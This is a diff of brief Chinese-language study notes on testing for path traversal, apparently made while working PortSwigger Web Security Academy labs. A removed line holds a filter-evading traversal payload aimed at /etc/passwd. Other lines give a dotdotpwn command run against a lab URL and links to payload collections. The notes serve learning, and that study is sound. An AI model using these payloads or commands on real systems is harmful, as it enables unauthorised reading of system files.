@@ -1,11 +1,13 @@
 比较常见的参数:path, filename, 大部分情况下用burp scanner就可以测试出来了。
-....//....//....//etc/passwd
 
+特殊的情况
+ https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path
+ 这个用burp虽然测试不出来，但是它还是会报一个file path manipulation
+ 
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
 可以试试tool
 https://github.com/wireghoul/dotdotpwn
  ./dotdotpwn.pl -m http-url -u https://0ad3002904d3995980bcd500004a0099.web-security-academy.net/image?filename=TRAVERSAL  -O -k "root:" -r webmin.txt
  
- 特殊的情况
- https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path
+ 
  
